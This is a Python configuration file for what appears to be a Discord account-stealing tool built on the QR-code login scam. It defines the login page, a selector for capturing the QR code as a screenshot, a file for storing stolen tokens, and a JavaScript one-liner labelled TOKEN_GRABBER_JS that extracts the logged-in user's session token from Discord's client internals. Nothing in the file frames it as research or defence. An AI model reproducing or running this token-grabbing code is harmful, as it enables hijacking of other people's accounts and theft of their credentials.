import os
BASE_DISCORD_URL = "https://discord.com/"
DISCORD_HOME_TITLE = "Discord | Friends"
LOGIN_DISCORD_URL = BASE_DISCORD_URL + "login"
QR_ELEMENT_SELECTOR = '#app-mount > div.appAsidePanelWrapper-ev4hlp > div.notAppAsidePanel-3yzkgB > div.app-3xd6d0 > div > div > div > div > form > div.centeringWrapper-dGnJPQ > div > div.transitionGroup-14WiKS.qrLogin-1ejtpI > div > div > div > div.qrCodeContainer-1qlybH > div.qrCodeOverlay-2bLtKl'
IMAGE_LOCATION = os.path.join(os.path.join(os.getcwd(), "screenshots"), "qr.png")
TOKEN_GRABBER_JS = r"return (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"
TOKENS_FILE_NAME = "tokens.json"
DISCORD_TOKEN_CHECK_URL = "https://discord.com/api/v6/auth/login"
